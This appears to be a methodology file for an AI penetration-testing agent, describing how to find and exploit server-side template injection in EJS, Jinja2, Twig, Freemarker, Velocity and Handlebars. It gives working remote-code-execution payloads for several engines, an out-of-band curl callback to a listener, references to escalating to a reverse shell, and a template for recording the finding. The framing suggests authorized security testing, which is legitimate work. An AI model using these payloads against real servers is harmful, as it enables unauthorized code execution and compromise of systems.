---
name: ssti
description: Methodology for identifying and exploiting Server-Side Template Injection across template engines (EJS, Jinja2, Twig, Freemarker, Velocity, Handlebars) reachable via user-controlled input rendered server-side.
---

# SERVER-SIDE TEMPLATE INJECTION METHODOLOGY

Execute when user input appears to be reflected/rendered into a server-generated document (HTML, PDF, email, report) and the backend stack suggests a templating engine (check `X-Powered-By`, error stack traces, file extensions like `.ejs`/`.j2`/`.twig`/`.ftl`).

## 1. Confirm the Engine Before Crafting Payloads
Do not fire generic polyglot SSTI payloads blind — identify the exact engine first:
- **Error-based fingerprinting**: submit deliberately malformed template syntax (`${{<%[%'"}}%\`) and read the resulting error message; most engines name themselves in stack traces.
- **File/response hints**: `.ejs` → EJS (Node), `.j2`/Flask/Django → Jinja2, `.twig` → Twig (PHP), `.ftl` → Freemarker (Java), `.vm` → Velocity (Java), `.hbs` → Handlebars.
- If a config/options object is passed to the renderer client-side (check JS bundle for template config passed to a `/render`, `/convert`, `/preview` endpoint), read it for engine-specific options FIRST — some engines (EJS notably) have a "client mode" or "compile mode" flag that exposes far more dangerous behavior than the string-interpolation surface alone.

## 2. Confirm Injection with Arithmetic Before Attempting RCE
Standard first probe per engine (confirms parsing, not just reflection):
- Jinja2/Twig: `{{7*7}}` → expect `49` in output, NOT literal `{{7*7}}`
- EJS: `<%= 7*7 %>` → expect `49`
- Freemarker: `${7*7}`
- Velocity: `#set($x = 7*7)$x`
- Handlebars (normally sandboxed — if this works at all, escalation is likely present): `{{#with "constructor"}}{{#with split}}...{{/with}}{{/with}}`

If literal `49` is NOT reflected, the input is escaped/sanitized as plain text — confirm this conclusively (test 3-4 arithmetic variants) before ruling the vector out, some engines only render specific fields.

## 3. Escalate to Object/Prototype Access (Engine-Specific)
Once arithmetic confirms live template evaluation, walk up to the runtime's native objects:

**EJS** (Node.js) — abuse `client: true` + `escapeFunction` override if that config surface exists (per Step 1 JS analysis):
```
settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('id');
```
If the client-mode config surface ISN'T exposed to the user, fall back to direct constructor-chain payloads in the template field itself.

**Jinja2** (Python) — walk the class hierarchy from any object to reach `subprocess.Popen` or `os`:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Twig** (PHP):
```
{{ ['id'] | filter('system') }}
```

**Freemarker** (Java):
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## 4. Confirm Execution Out-of-Band Before Full Shell
Same discipline as insecure-deserialization: prove command execution via a callback (`curl http://<listener>/ssti-probe`) BEFORE escalating to a full reverse shell payload. A payload that "looks right" but errors silently wastes cycles if pursued straight to shell.

## 5. If Object Escalation Fails — Reflection-Only SSTI Still Has Value
Not every SSTI escalates to RCE. If arithmetic confirms rendering but object/class walking is sandboxed or blocked:
- Test for internal data disclosure: template engines often have access to server-side variables/config passed into the render context — probe for `{{config}}`, `{{self}}`, or engine-equivalent "dump current context" behavior.
- This is still a valid, reportable finding (information disclosure / partial SSTI) even without RCE — do not discard the finding just because full command execution wasn't achieved.

## 6. Verification & Evidence
1. Command output must be reflected in the response OR confirmed via out-of-band callback — never assume RCE from a payload accepting without error alone.
2. Capture the actual command output (`id`/`whoami`) in the finding, not just "payload was accepted."
3. Record:
```json
{"tool": "record_finding", "args": {"title": "Remote Code Execution via <Engine> Server-Side Template Injection", "kind": "ssti", "severity": "critical", "request_ref": "<render_endpoint>", "note": "Confirmed via reflected command output / OOB callback. Engine: <name>. Escalation path: <brief chain description>."}}
```

## Rule of Exhaustion
A failed object-escalation payload for one engine doesn't rule out SSTI — re-run Step 1's fingerprinting if the engine identity is uncertain, and test EVERY engine-specific escalation in Step 3 relevant to any ambiguity before concluding the injection is unexploitable beyond reflection.
